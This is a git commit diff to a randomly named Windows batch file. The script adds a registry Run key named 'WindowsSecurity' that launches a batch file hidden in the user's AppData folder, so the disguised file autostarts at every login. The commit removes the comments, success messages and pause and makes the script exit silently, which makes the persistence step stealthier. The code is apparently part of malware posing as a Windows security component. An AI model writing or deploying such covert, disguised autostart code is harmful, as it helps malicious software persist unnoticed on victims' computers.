8e5570573386ddfc0f120799869cea9132f90c77
JelleF09 <137308002+JelleF09@users.noreply.github.com>
2025-05-29 06:55:28 +0200

    Update Z6s769T4WWKnjIBWIx7v.bat

--- Z6s769T4WWKnjIBWIx7v.bat
+++ Z6s769T4WWKnjIBWIx7v.bat
@@ -1,16 +1,5 @@
 @echo off
 setlocal
-
-REM Define the path to the batch file
 set "batPath=%appdata%\windows security\windowssecurity.bat"
-
-REM Use escaped quotes properly in the registry command
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurity" /t REG_SZ /d "\"%batPath%\"" /f
-
-if %errorlevel% EQU 0 (
-    echo Startup entry added successfully.
-) else (
-    echo Failed to add startup entry.
-)
-
-pause
+exit
